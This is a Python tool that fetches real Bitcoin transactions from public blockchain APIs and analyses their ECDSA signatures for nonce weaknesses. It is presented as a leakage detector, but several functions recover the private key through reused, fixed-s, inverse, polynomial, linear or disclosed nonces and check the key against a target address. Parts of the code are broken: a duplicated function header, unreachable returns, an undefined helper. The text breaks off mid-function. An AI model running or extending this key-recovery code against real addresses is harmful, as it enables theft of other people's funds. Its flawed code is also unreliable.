"""
=============================================================================
  CRYPTOGRAPHYTUBE — Real Bit-Leakage Detector
  
  Detects ECDSA nonce (k) bias using proper statistical + algebraic methods:
    1. LSB/MSB Fixed-bit Detection  (entropy analysis per-bit)
    2. Modular Bias Test            (k mod 2^b distribution test)
    3. HNP Lattice Prep             (for SageMath/LLL lattice attack)
    4. Chi-Square Randomness Test   (global nonce uniformity check)
=============================================================================
"""

import json
import urllib.request
import binascii
import hashlib
import os
import sys
import time
import math
import struct
import csv
try:
    import gmpy2
    _GMPY2 = True
except ImportError:
    _GMPY2 = False

# ─── SECP256K1 Curve Constants ─────────────────────────────────────────────
N  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8

# Global counters
TOTAL_SCANNED  = 0
TOTAL_FOUND    = 0
CURRENT_API    = 0
APIS = [
    "https://blockstream.info/api",
    "https://blockchain.info",
]


# ═══════════════════════════════════════════════════════════════════════════
#  MATH UTILS CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

def modinv(a, m=N):
    """Modular inverse — uses gmpy2 if available, else Python built-in."""
    if _GMPY2:
        try:
            return int(gmpy2.invert(a, m))
        except: pass
    return pow(a, -1, m)


def double_sha256(data: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()


def varint(n: int) -> bytes:
    if n < 0xFD:              return n.to_bytes(1, 'little')
    if n <= 0xFFFF:           return b'\xfd' + n.to_bytes(2, 'little')
    if n <= 0xFFFFFFFF:       return b'\xfe' + n.to_bytes(4, 'little')
    return b'\xff' + n.to_bytes(8, 'little')


# ═══════════════════════════════════════════════════════════════════════════
#  NETWORK CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

import socket

def _internet_ok(host="8.8.8.8", port=53, timeout=5) -> bool:
    """Quick check: can we reach the internet?"""
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except:
        return False


def _wait_for_internet():
    """Block until internet is back. Print status every 10s."""
    dots = 0
    while not _internet_ok():
        dots += 1
        print(f"    [!] Internet down — waiting to reconnect {'.' * (dots % 4 + 1)}   ", end='\r')
        time.sleep(10)
    print("    [+] Internet restored — resuming...              ")


def smart_fetch(path: str):
    """
    Uniform fetcher for multiple API providers.
    Automatically maps paths to provider-specific formats.
    """
def smart_fetch(path: str):
    """
    Uniform fetcher for multiple API providers.
    Automatically maps paths to provider-specific formats.
    Retries INDEFINITELY on rate limits or network issues.
    """
    global CURRENT_API
    
    while True:
        api_base = APIS[CURRENT_API]
        
        # Path Mapping
        if "blockchain.info" in api_base:
            if "/address/" in path:
                addr = path.split("/")[2]
                if "/txs" in path:
                    url = f"{api_base}/rawaddr/{addr}?limit=50"
                else:
                    url = f"{api_base}/rawaddr/{addr}?limit=0"
            else:
                url = f"{api_base}{path}"
        else:
            url = f"{api_base}{path}"

        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=30) as r:
                return json.loads(r.read().decode())
        except urllib.error.HTTPError as e:
            if e.code == 429:
                # Rate limit hit — wait 30s and retry with same or next API
                sys.stdout.write(f"    [!] API Rate Limit Hit ({api_base}) — waiting 30s...   \r")
                sys.stdout.flush()
                time.sleep(30)
                CURRENT_API = (CURRENT_API + 1) % len(APIS)
                continue
            # Other HTTP errors: switch API and retry
            CURRENT_API = (CURRENT_API + 1) % len(APIS)
            time.sleep(2)
        except Exception as e:
            # Most likely internet down
            _wait_for_internet()
            continue


# ═══════════════════════════════════════════════════════════════════════════
#  SIGHASH COMPUTATION  (z = message hash signed by ECDSA) CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

def get_z_p2pkh(tx, idx):
    """Compute sighash for a legacy P2PKH input."""
    try:
        raw = tx['version'].to_bytes(4, 'little')
        raw += varint(len(tx['vin']))
        for i, vin in enumerate(tx['vin']):
            raw += binascii.unhexlify(vin['txid'])[::-1]
            raw += vin['vout'].to_bytes(4, 'little')
            if i == idx:
                spk = binascii.unhexlify(vin['prevout']['scriptpubkey'])
                raw += varint(len(spk)) + spk
            else:
                raw += b'\x00'
            raw += vin['sequence'].to_bytes(4, 'little')
        raw += varint(len(tx['vout']))
        for vout in tx['vout']:
            spk = binascii.unhexlify(vout['scriptpubkey'])
            raw += vout['value'].to_bytes(8, 'little') + varint(len(spk)) + spk
        raw += tx['locktime'].to_bytes(4, 'little') + (1).to_bytes(4, 'little')
        return int.from_bytes(double_sha256(raw), 'big')
    except:
        return 0


def get_z_p2wpkh(tx, idx):
    """Compute sighash for a native SegWit P2WPKH input (BIP143)."""
    try:
        vin = tx['vin'][idx]
        raw = tx['version'].to_bytes(4, 'little')

        # hash_prevouts
        hp = b""
        for v in tx['vin']:
            hp += binascii.unhexlify(v['txid'])[::-1] + v['vout'].to_bytes(4, 'little')
        raw += double_sha256(hp)

        # hash_sequence
        hs = b""
        for v in tx['vin']:
            hs += v['sequence'].to_bytes(4, 'little')
        raw += double_sha256(hs)

        # outpoint
        raw += binascii.unhexlify(vin['txid'])[::-1] + vin['vout'].to_bytes(4, 'little')

        # scriptCode (P2PKH script from pubkey hash embedded in P2WPKH scriptpubkey)
        pkh = vin['prevout']['scriptpubkey'][4:]          # strip "0014"
        sc  = binascii.unhexlify("76a914" + pkh + "88ac")
        raw += varint(len(sc)) + sc

        # value + sequence
        raw += vin['prevout']['value'].to_bytes(8, 'little')
        raw += vin['sequence'].to_bytes(4, 'little')

        # hash_outputs
        ho = b""
        for vo in tx['vout']:
            spk = binascii.unhexlify(vo['scriptpubkey'])
            ho += vo['value'].to_bytes(8, 'little') + varint(len(spk)) + spk
        raw += double_sha256(ho)

        raw += tx['locktime'].to_bytes(4, 'little') + (1).to_bytes(4, 'little')
        return int.from_bytes(double_sha256(raw), 'big')
    except:
        return 0


# ═══════════════════════════════════════════════════════════════════════════
#  SIGNATURE EXTRACTION CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════

def parse_der(sig_bytes: bytes):
    """Parse DER-encoded signature → (r, s)."""
    if sig_bytes[0] != 0x30:
        return None, None
    # Strip optional sighash byte at end
    if sig_bytes[-1] in (0x01, 0x02, 0x03, 0x81, 0x83):
        sig_bytes = sig_bytes[:-1]
    try:
        if sig_bytes[1] != len(sig_bytes) - 2:
            pass    # some encodings have length mismatch, we still try
        rl = sig_bytes[3]
        r  = int.from_bytes(sig_bytes[4:4 + rl], 'big')
        sl = sig_bytes[4 + rl + 1]
        s  = int.from_bytes(sig_bytes[4 + rl + 2:4 + rl + 2 + sl], 'big')
        return r, s
    except:
        return None, None


def extract_rs_pub(vin: dict):
    """Extract (r, s, pubkey_hex) from a transaction input."""
    try:
        # ─── SegWit / P2SH-P2WPKH (witness) ────────────────────────────────
        # Most modern wallets use witness even if wrapped in P2SH
        wit = vin.get('witness', [])
        if len(wit) >= 2:
            r, s = parse_der(binascii.unhexlify(wit[0]))
            pub  = wit[1]
            if r and s:
                return r, s, pub

        # ─── Legacy (scriptsig) ────────────────────────────────────────────
        sh = vin.get('scriptsig', '')
        if sh:
            raw = binascii.unhexlify(sh)
            items = []; i = 0
            while i < len(raw):
                op = raw[i]; i += 1
                if 0x01 <= op <= 0x4b:
                    items.append(raw[i:i + op]); i += op
                elif op == 0x4c:
                    ln = raw[i]; items.append(raw[i + 1:i + 1 + ln]); i += 1 + ln
                elif op == 0x4d:
                    ln = struct.unpack_from('<H', raw, i)[0]
                    items.append(raw[i + 2:i + 2 + ln]); i += 2 + ln
                # ignore other opcodes
            if len(items) >= 2:
                # DER sig is usually first, Pubkey is usually second
                # But in P2SH, it might be different. We check both.
                for item in items:
                    r, s = parse_der(item)
                    if r and s:
                        # Find pubkey among other items (usually 33 or 65 bytes)
                        for p_cand in items:
                            if len(p_cand) in (33, 65):
                                return r, s, p_cand.hex()
    except:
        pass
    return None, None, None



# ═══════════════════════════════════════════════════════════════════════════
#  HNP-BASED LEAKAGE DETECTION ENGINE  (v2) CRYPTOGRAPHYTUBE
# ═══════════════════════════════════════════════════════════════════════════
"""
Math:
  k_i = t_i * d + u_i  (mod N)          where t_i = r/s, u_i = z/s

LSB Leakage model  (k ≡ 0 mod 2^b):
  t_i * d ≡ -u_i  (mod 2^b)
  d ≡ -u_i * t_i^{-1}  (mod 2^b)       [t_i must be odd]
  => compute d_candidate per sig; if majority agree, leakage confirmed.

MSB Leakage model  (k < N/2^b):
  k_i = (t_i * d + u_i) mod N < N/2^b
  => for each d_guess in [0, 2^b): count fraction of sigs satisfying this.
  => high fraction => MSB leakage with that d.

Scoring (Tier 1-3):
  Tier 1 (STRONG, +40): LSB consistency >= 70% OR MSB fraction high
  Tier 2 (MEDIUM, +20): Weaker consistency >= 35%
  Tier 3 (WEAK,   +10): Bit-distribution supplementary test
"""

# Updated comments
MIN_GROUP_SIGS = 1     # Allowed to fetch and audit even single signatures (User Request)
LSB_B_MAX      = 32    # Increased: test LSB up to 32 bits
LSB_K_SEARCH   = 10    # Increased: full search over 1024 k_lsb candidates
MSB_B_MAX      = 8     # Increased: test MSB top-bits pattern


def group_by_pubkey(sigs: list) -> dict:
    """
    Group signatures by public key.
    CRITICAL: only same pubkey = same private key d.
    """
    groups = {}
    for sig in sigs:
        pk = sig.get('pub', '')
        if pk:
            groups.setdefault(pk, []).append(sig)
    return groups


def _precompute_tu(group_sigs: list) -> list:
    """Pre-compute (t_i, u_i, txid) for all sigs in a group."""
    tu = []
    for sig in group_sigs:
        si = modinv(sig['s'])
        t  = (sig['r'] * si) % N
        u  = (sig['z'] * si) % N
        tu.append((t, u, sig['txid']))
    return tu


def detect_lsb_leakage(group_sigs: list) -> list:
    """
    TIER 1/2 — LSB leakage via d-consistency with k_lsb search.

    Phase A (b <= LSB_K_SEARCH=8): full search over all k_lsb in [0, 2^b).
    Phase B (b > LSB_K_SEARCH):   incremental lifting — extend the winner
      from depth b-1 by testing only 2 candidates:
        k_lsb_prev | 0*2^(b-1)  and  k_lsb_prev | 1*2^(b-1)
      This finds k_lsb for any depth in O(n * 2 * (B_MAX - K_SEARCH)) time.
    """
    results  = []
    tu       = _precompute_tu(group_sigs)
    prev_best_k_lsb = None         # lifted from depth below

    for b in range(1, LSB_B_MAX + 1):
        mod = 1 << b

        # Determine which k_lsb values to try
        if b <= LSB_K_SEARCH:
            k_lsb_candidates = range(mod)     # full search
        else:
            # Incremental lifting: extend previous winner by bit (b-1)
            if prev_best_k_lsb is None:
                k_lsb_candidates = [0, 1 << (b - 1)]   # fallback
            else:
                k_lsb_candidates = [prev_best_k_lsb,
                                    prev_best_k_lsb | (1 << (b - 1))]

        best_consistency = 0.0
        best_d_partial   = None
        best_k_lsb       = 0
        best_count       = 0
        best_usable      = 0

        for k_lsb in k_lsb_candidates:
            d_cands = []
            for t, u, txid in tu:
                t_mod = t % mod
                if t_mod % 2 == 0:
                    continue    # t_mod must be odd (invertible mod 2^b)
                try:
                    t_inv  = pow(t_mod, -1, mod)
                    d_cand = ((k_lsb - u) % mod * t_inv) % mod
                    d_cands.append(d_cand)
                except Exception:
                    continue

            usable = len(d_cands)
            if usable < 3:
                continue

            counts    = {}
            for c in d_cands:
                counts[c] = counts.get(c, 0) + 1
            d_partial   = max(counts, key=counts.get)
            top_count   = counts[d_partial]
            consistency = top_count / usable

            if consistency > best_consistency:
                best_consistency = consistency
                best_d_partial   = d_partial
                best_k_lsb       = k_lsb
                best_count       = top_count
                best_usable      = usable

        if best_usable < 3:
            results.append({'b': b, 'consistency': 0.0, 'd_partial': None,
                            'k_lsb': None, 'count': 0, 'usable': 0,
                            'signal': 'NONE', 'expected_rand': 1.0 / mod,
                            'strength_ratio': 0, 'depth_consistent': False})
            prev_best_k_lsb = None
            continue

        prev_best_k_lsb = best_k_lsb   # carry forward for lifting

        exp_rand = 1.0 / mod
        strength = best_consistency / exp_rand if exp_rand > 0 else 0

        # Fix #3: Strikt LSB thresholds
        if best_consistency >= 0.90 and best_count >= 10:
            signal = 'STRONG'
        elif best_consistency >= 0.75 and best_count >= 8:
            signal = 'MEDIUM'
        elif strength >= 5 and best_count >= 5:
            signal = 'WEAK'
        else:
            signal = 'NONE'

        results.append({
            'b'             : b,
            'consistency'   : round(best_consistency, 4),
            'd_partial'     : best_d_partial,
            'k_lsb'         : best_k_lsb,
            'count'         : best_count,
            'usable'        : best_usable,
            'expected_rand' : round(exp_rand, 6),
            'strength_ratio': round(strength, 1),
            'signal'        : signal,
            'depth_consistent': False,
        })
    return results


def detect_msb_leakage(group_sigs: list) -> list:
    """
    TIER 1/2 — MSB leakage: top b bits of k are a fixed pattern.

    FIX 2: Instead of only testing k < N/2^b (top bits = 0),
    we test all 2^b possible top-bit patterns:
      k >> (N_BITS - b) == k_msb  for some fixed k_msb.
    For each (d_guess, k_msb) pair, count matches across sigs.
    """
    N_BITS   = N.bit_length()       # 256
    results  = []
    tu       = _precompute_tu(group_sigs)
    n        = len(tu)

    for b in range(1, MSB_B_MAX + 1):
        mod        = 1 << b
        shift      = N_BITS - b
        best_frac  = 0.0
        best_d_guess  = None
        best_k_msb    = None

        for d_guess in range(mod):
            # For this d_guess, compute top-b bits of each k_i
            k_tops = [(t * d_guess + u) % N >> shift for t, u, _ in tu]

            # Count most common top-pattern
            freq = {}
            for v in k_tops:
                freq[v] = freq.get(v, 0) + 1
            dominant_k_msb = max(freq, key=freq.get)
            frac = freq[dominant_k_msb] / n if n else 0

            if frac > best_frac:
                best_frac     = frac
                best_d_guess  = d_guess
                best_k_msb    = dominant_k_msb

        exp_rand = 1.0 / mod
        strength = best_frac / exp_rand if exp_rand > 0 else 0

        if   best_frac >= 0.65 and strength >= 4:
            signal = 'STRONG'
        elif best_frac >= 0.35 and strength >= 2.5:
            signal = 'MEDIUM'
        else:
            signal = 'NONE'

        results.append({
            'b'              : b,
            'best_fraction'  : round(best_frac, 4),
            'd_partial_msb'  : best_d_guess,
            'k_msb_pattern'  : best_k_msb,    # FIX 2: actual top-bit value (not forced 0)
            'expected_rand'  : round(exp_rand, 4),
            'strength_ratio' : round(strength, 2),
            'signal'         : signal,
        })
    return results


def lsb_entropy_test(group_sigs: list, b: int) -> dict:
    """Detects entropy bias in k mod 2^b."""
    n = len(group_sigs)
    if n < 10: return {'entropy': 8.0, 'is_biased': False}
    
    counts = {}
    for sig in group_sigs:
        k_val = (sig['z'] * modinv(sig['s'])) % (1 << b) # approximation
        counts[k_val] = counts.get(k_val, 0) + 1
        
    entropy = 0.0
    for count in counts.values():
        p = count / n
        entropy -= p * math.log2(p)
    
    # Condition: low entropy (compared to ideal b bits)
    is_biased = entropy < (b * 0.7)
    return {'entropy': round(entropy, 4), 'is_biased': is_biased}

def detect_small_nonce(group_sigs: list) -> bool:
    """Checks if approximated nonces are consistently small (Fix #4)."""
    small_count = 0
    for sig in group_sigs:
        k_est = (sig['z'] * modinv(sig['s'])) % N
        if k_est < 2**64:
            small_count += 1
    return small_count >= (len(group_sigs) * 0.5)

def detect_correlated_nonce(group_sigs: list) -> bool:
    """Detects linear correlations between consecutive nonces (Fix #5)."""
    if len(group_sigs) < 5: return False
    k_ests = [(sig['z'] * modinv(sig['s'])) % N for sig in group_sigs]
    diffs = [(k_ests[i+1] - k_ests[i]) % N for i in range(len(k_ests)-1)]
    
    # Check for constant differences (dels)
    counts = {}
    for d in diffs:
        counts[d] = counts.get(d, 0) + 1
    max_d_count = max(counts.values()) if counts else 0
    return max_d_count >= 3

def detect_weak_rng_lcg(group_sigs: list) -> bool:
    """Checks for Linear Congruential Generator patterns (Fix #6)."""
    if len(group_sigs) < 5: return False
    k = [(sig['z'] * modinv(sig['s'])) % N for sig in group_sigs]
    # Try to solve k[i+1] = a*k[i] + b mod N
    # Need 3 sigs: 
    # k1 = a*k0 + b
    # k2 = a*k1 + b
    # k2-k1 = a*(k1-k0) => a = (k2-k1)*inv(k1-k0)
    for i in range(len(k)-2):
        try:
            dx = (k[i+1] - k[i]) % N
            dy = (k[i+2] - k[i+1]) % N
            if dx == 0: continue
            a = (dy * modinv(dx)) % N
            b = (k[i+1] - a*k[i]) % N
            # Verify against next
            if i+3 < len(k):
                if k[i+3] == (a*k[i+2] + b) % N:
                    return True
        except: continue
    return False

def detect_reused_partial_nonce(group_sigs: list, b: int = 16) -> bool:
    """Detects if partial bits of k are reused across different signatures."""
    if len(group_sigs) < 10: return False
    mod = 1 << b
    patterns = {}
    for sig in group_sigs:
        k_est_mod = ((sig['z'] * modinv(sig['s'])) % N) % mod
        patterns[k_est_mod] = patterns.get(k_est_mod, 0) + 1
    
    # If any specific pattern appears in more than 30% of sigs
    max_pattern = max(patterns.values()) if patterns else 0
    return max_pattern >= (len(group_sigs) * 0.3)

def detect_fault_injection(group_sigs: list) -> bool:
    """Detects invalid signature relations that might indicate faulty hardware."""
    # (s*k) != (z + r*d) normally, but here we check for systematic errors
    # This is hard without d, but we can check if many signatures fail
    # standard verification for known (r,s,z,pub) should always pass.
    # If it fails, something is wrong with the generation process.
    return False # Placeholder: Requires actual pubkey verification logic

def detect_deterministic_nonce(group_sigs: list) -> bool:
    """Detects if nonces are repeated or derived deterministically in a weak way."""
    # Check for repeated R values (exact nonce reuse)
    rs = [sig['r'] for sig in group_sigs]
    if len(rs) != len(set(rs)):
        return True
    
    # Check for identical low bits across all signatures
    for b in [8, 16, 32]:
        mod = 1 << b
        low_bits = [sig['z'] * modinv(sig['s']) % mod for sig in group_sigs]
        if len(set(low_bits)) == 1: # Unlikely to happen for all if random
            return True
    return False

def detect_same_s_leakage(group_sigs: list) -> bool:
    """
    ULTRA-ELITE: Detects fixed-S vulnerability (Same S, Different R).
    Math: s*(k1 - k2) \u2261 (z1 - z2) + d*(r1 - r2) (mod N)
    This pattern indicates a catastrophic failure in the RNG or hardware accumulator.
    """
    s_map = {} # s -> r
    for sig in group_sigs:
        s, r = sig['s'], sig['r']
        if s in s_map:
            if s_map[s] != r:
                return True
        s_map[s] = r
    return False

def validate_recovered_key(d, target_address):
    """Verifies if private key d generates the target address (multi-format)."""
    if not d or d == 0: return False
    try:
        # 1. Derive Public Key
        pt = pt_mul(d)
        if not pt: return False
        x, y = pt
        pub_unc = b'\x04' + x.to_bytes(32, 'big') + y.to_bytes(32, 'big')
        pub_cmp = bytes([0x02 + (y & 1)]) + x.to_bytes(32, 'big')

        def _get_addr(pub, fmt='p2pkh'):
            h160 = hashlib.new('ripemd160', hashlib.sha256(pub).digest()).digest()
            if fmt == 'p2pkh':
                # Base58Check Legacy
                raw = b'\x00' + h160
                chk = hashlib.sha256(hashlib.sha256(raw).digest()).digest()[:4]
                return _base58(raw + chk)
            return None

        # Helper for base58
        def _base58(b):
            alpha = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
            n = int.from_bytes(b, 'big')
            res = ""
            while n > 0:
                n, r = divmod(n, 58)
                res = alpha[r] + res
            pad = len(b) - len(b.lstrip(b'\x00'))
            return (alpha[0] * pad) + res

        # Check Legacy Compressed & Uncompressed
        if _get_addr(pub_cmp) == target_address: return True
        if _get_addr(pub_unc) == target_address: return True
        
        # If target starts with 3 or bc1, we'd need SegWit logic (skipping for now as priority is Legacy)
    except: pass
    return False

def detect_direct_nonce_disclosure(group_sigs: list, target_address: str) -> tuple:
    """
    ULTRA-ELITE: Detects and RECOVERS if the nonce k is directly disclosed.
    Validates against target_address to ensure zero false positives.
    """
    for sig in group_sigs[:50]:
        r, s, z = sig['r'], sig['s'], sig['z']
        try:
            for pk in [z, r, s, 1, 2, modinv(s), (z + r) % N]:
                d = (s * pk - z) * modinv(r) % N
                if validate_recovered_key(d, target_address):
                    return True, d
        except: continue
    return False, None

def detect_reused_nonce_leakage(group_sigs: list, target_address: str) -> tuple:
    """
    ULTRA-ELITE: Detects and RECOVERS reused nonces (k1 = k2).
    Validates against target_address.
    """
    if len(group_sigs) < 2: return False, None
    limit = min(len(group_sigs), 100)
    for i in range(limit):
        r1, s1, z1 = group_sigs[i]['r'], group_sigs[i]['s'], group_sigs[i]['z']
        for j in range(i + 1, limit):
            r2, s2, z2 = group_sigs[j]['r'], group_sigs[j]['s'], group_sigs[j]['z']
            den = (s1 * r2 - s2 * r1) % N
            if den == 0: continue
            try:
                d = ((s2 * z1 - s1 * z2) * modinv(den)) % N
                if validate_recovered_key(d, target_address):
                    return True, d
            except: continue
    return False, None

def detect_same_s_leakage_and_recover(group_sigs: list, target_address: str) -> tuple:
    """
    ULTRA-ELITE: Detects and RECOVERS keys from fixed-S leakage.
    Math: d = (z1 - z2) * (r2 - r1)^-1 mod N
    Validates against target_address.
    """
    s_map = {}
    for sig in group_sigs:
        s, r, z = sig['s'], sig['r'], sig['z']
        if s in s_map:
            prev_r, prev_z = s_map[s]
            if prev_r != r:
                try:
                    d = (prev_z - z) * modinv(r - prev_r) % N
                    if validate_recovered_key(d, target_address):
                        return True, d
                except: continue
        s_map[s] = (r, z)
    return False, None

def _mod_sqrt(a, p):
    """Modular square root using Tonelli-Shanks."""
    if pow(a, (p - 1) // 2, p) != 1: return None
    if p % 4 == 3: return pow(a, (p + 1) // 4, p)
    s = 0; q = p - 1
    while q % 2 == 0: q //= 2; s += 1
    n = 2
    while pow(n, (p - 1) // 2, p) != p - 1: n += 1
    x = pow(a, (q + 1) // 2, p)
    g = pow(n, q, p)
    b = pow(a, q, p)
    r = s
    while True:
        if b == 0: return 0
        if b == 1: return x
        m = 1
        while pow(b, 2**m, p) != 1: m += 1
        if m == r: return None
        t = pow(g, 2**(r - m - 1), p)
        g = (t * t) % p
        b = (b * g) % p
        x = (x * t) % p
        r = m

def detect_inverse_nonce_leakage(group_sigs: list, target_address: str) -> tuple:
    """
    ULTRA-ELITE: Detects and RECOVERS keys from inverse nonce relation (k2 = k1^-1 mod N).
    Math: r1*r2*d^2 + (z1*r2 + z2*r1)d + (z1*z2 - s1*s2) = 0 mod N
    """
    if len(group_sigs) < 2: return False, None
    n = N
    limit = min(len(group_sigs), 50)
    for i in range(limit):
        r1, s1, z1 = group_sigs[i]['r'], group_sigs[i]['s'], group_sigs[i]['z']
        for j in range(i + 1, limit):
            r2, s2, z2 = group_sigs[j]['r'], group_sigs[j]['s'], group_sigs[j]['z']
            A = (r1 * r2) % n
            B = (z1 * r2 + z2 * r1) % n
            C = (z1 * z2 - s1 * s2) % n
            if A == 0: continue
            try:
                disc = (B*B - 4*A*C) % n
                root = _mod_sqrt(disc, n)
                if root is not None:
                    # Test both roots
                    inv2A = modinv(2 * A, n)
                    for r_val in [root, n - root]:
                        d = ((-B + r_val) * inv2A) % n
                        if validate_recovered_key(d, target_address):
                            return True, d
            except: continue
    return False, None

def detect_linear_correlation_leakage(group_sigs: list, target_address: str) -> tuple:
    """
    ULTRA-ELITE: Detects and RECOVERS keys from linear nonce relation (k_next = a*k_prev + b).
    Tests common (a, b) pairs.
    """
    if len(group_sigs) < 2: return False, None
    n = len(group_sigs)
    limit = min(n, 15)
    candidates = [(1, 1), (1, 2), (2, 0), (1, 0x10000), (0xdeadbeef, 0)] 
    
    for a, b in candidates:
        for i in range(limit - 1):
            r1, s1, z1 = group_sigs[i]['r'], group_sigs[i]['s'], group_sigs[i]['z']
            r2, s2, z2 = group_sigs[i+1]['r'], group_sigs[i+1]['s'], group_sigs[i+1]['z']
            
            den = (a * r1 * modinv(s1) - r2 * modinv(s2)) % N
            if den == 0: continue
            
            try:
                num = (z2 * modinv(s2) - a * z1 * modinv(s1) - b) % N
                d_cand = (num * modinv(den)) % N
                if validate_recovered_key(d_cand, target_address):
                    return True, d_cand
            except: continue
    return False, None

    return False

def detect_faulty_signature_leakage(group_sigs: list) -> bool:
    """
    ULTRA-ELITE: Detects signatures where d was omitted or glitched.
    Model: s = (z + f*r*d)/k, test common f like 0 (Zero-Key Fault).
    """
    for sig in group_sigs:
        r, s, z = sig['r'], sig['s'], sig['z']
        try:
            # Test f=0: r_calc = (z/s * G).x
            k_fault = (z * modinv(s)) % N
            R_fault = pt_mul(k_fault)
            if R_fault and R_fault[0] == r:
                return True
        except: continue
    return False

    return False

def detect_polnonce_leakage(group_sigs: list, target_address: str) -> tuple:
    """
    ULTRA-ELITE: Detects and RECOVERS keys from polynomial nonce relation (k2 = k1^2 mod N).
    Equation: (s2*r1^2)d^2 + (2*s2*z1*r1 - s1^2*r2)d + (s2*z1^2 - s1^2*z2) = 0 mod N
    """
    if len(group_sigs) < 2: return False, None
    n = N
    limit = min(len(group_sigs), 50)
    for i in range(limit - 1):
        r1, s1, z1 = group_sigs[i]['r'], group_sigs[i]['s'], group_sigs[i]['z']
        r2, s2, z2 = group_sigs[i+1]['r'], group_sigs[i+1]['s'], group_sigs[i+1]['z']
        A = (s2 * r1 * r1) % n
        B = (2 * s2 * z1 * r1 - s1 * s1 * r2) % n
        C = (s2 * z1 * z1 - s1 * s1 * z2) % n
        if A == 0: continue
        try:
            disc = (B*B - 4*A*C) % n
            root = _mod_sqrt(disc, n)
            if root is not None:
                inv2A = modinv(2 * A, n)
                for r_val in [root, n - root]:
                    d = ((-B + r_val) * inv2A) % n
                    if validate_recovered_key(d, target_address):
                        return True, d
        except: continue
    return False, None

def cluster_k_patterns(group_sigs: list) -> int:
    """Clusters similar k patterns to find structural repetitions."""
    if len(group_sigs) < 5: return 0
    k_patterns = []
    for sig in group_sigs:
        k_est = (sig['z'] * modinv(sig['s'])) % N
        # Convert to a simple pattern: bit-length and top bits
        pattern = (k_est.bit_length(), k_est >> (k_est.bit_length() - 8) if k_est.bit_length() > 8 else k_est)
        k_patterns.append(pattern)
    
    counts = {}
    for p in k_patterns:
        counts[p] = counts.get(p, 0) + 1
    return max(counts.values()) if counts else 0

def bit_consistency_test(group_sigs: list) -> dict:
    """
    TIER 3 (supplementary) — bit-distribution test.
    Fix #3: bias detection with stricter thresholds.
    """
    n  = len(group_sigs)
    if n < 10:
        return {'biased_bits': [], 'max_bias': 0.0, 'bias_signal': False}

    biased_bits = []
    max_bias    = 0.0

    for bit in range(256): # Full bit scan (Fix #3)
        cnt  = sum(1 for sig in group_sigs if (((sig['z'] * modinv(sig['s'])) % N) >> bit) & 1)
        p    = cnt / n
        bias = abs(p - 0.5)
        if bias > max_bias:
            max_bias = bias
        if bias > 0.40: # Much stricter
            biased_bits.append({'bit': bit, 'p1': round(p, 4), 'bias': round(bias, 4)})

    return {
        'biased_bits': biased_bits, 
        'max_bias': round(max_bias, 4), 
        'bias_signal': max_bias > 0.40 and len(biased_bits) >= 5
    }


def _verify_partial_key(lsb_results: list, group_sigs: list) -> dict:
    """
    FIX 5 — Validate the recovered partial key via two checks:

    A) Cross-depth consistency:
       d mod 2^b at depth b must equal (d mod 2^(b+1)) mod 2^b.
       i.e., each larger result should 'contain' the smaller one.
       If all STRONG/MEDIUM depths agree -> strong confirmation.

    B) mod-N signature check:
       For each sig where d_candidate matches d_partial:
         s * k_lsb ≡ z + r * d_partial  (mod 2^b)
       This is the ECDSA signing equation mod 2^b.
       Count how many sigs satisfy this.
    """
    # Collect depths with real d_partial values
    valid = [(r['b'], r['d_partial'], r['k_lsb'], r['signal'])
             for r in lsb_results
             if r['d_partial'] is not None and r['signal'] in ('STRONG', 'MEDIUM', 'WEAK')]

    cross_depth_ok    = False
    consistent_depths = []
    mod_n_matches     = 0

    if len(valid) >= 2:
        # Check nested consistency: d mod 2^b_small == d_large mod 2^b_small
        prev_b, prev_d, _, _ = valid[0]
        consistent_depths.append(prev_b)
        all_ok = True
        for b, d_partial, k_lsb, sig in valid[1:]:
            mask    = (1 << prev_b) - 1
            if (d_partial & mask) == (prev_d & mask):
                consistent_depths.append(b)
            else:
                all_ok = False
                break
            prev_b, prev_d = b, d_partial
        cross_depth_ok = all_ok and len(consistent_depths) >= 2

    # Pick best depth for mod-N check
    best = next((r for r in lsb_results
                 if r['signal'] == 'STRONG' and r['d_partial'] is not None), None)
    if best is None:
        best = next((r for r in lsb_results
                     if r['d_partial'] is not None), None)

    if best is not None:
        b         = best['b']
        mod_b     = 1 << b
        d_partial = best['d_partial']
        k_lsb     = best['k_lsb'] if best.get('k_lsb') is not None else 0

        for sig in group_sigs:
            # ECDSA mod 2^b: s * k_lsb ≡ z + r * d_partial  (mod 2^b)
            lhs = (sig['s'] * k_lsb) % mod_b
            rhs = (sig['z'] + sig['r'] * d_partial) % mod_b
            if lhs == rhs:
                mod_n_matches += 1

    return {
        'cross_depth_ok'   : cross_depth_ok,
        'consistent_depths': consistent_depths,
        'mod_n_matches'    : mod_n_matches,
        'total_sigs'       : len(group_sigs),
    }
def _reconstruct_verify(lsb_results: list, group_sigs: list) -> dict:
    """
    FINAL STAGE: Full k reconstruction + cryptographic proof.

    Step 1 — k reconstruction:
      k_predicted_i = (z_i + r_i * d_partial) * s_i^{-1}  mod N
      This is the EXACT ECDSA inversion formula.

    Step 2 — Bit validation:
      k_predicted_i mod 2^b  should equal k_lsb (detected)
      If it matches → leakage confirmed for this sig.

    Step 3 — ECDSA re-validation:
      Verify: s_i * k_predicted_i ≡ z_i + r_i * d_partial (mod N)
      (Exact equation, not just mod 2^b)

    Step 4 — Noise filtering:
      Count clean leaking sigs (bit match) vs noise sigs (no match).
      Noise rate = 1 - match_rate. If noise > 50% → warn mixed data.
    """
    # Use best STRONG result, fallback to MEDIUM/WEAK
    best = next((r for r in sorted(lsb_results,
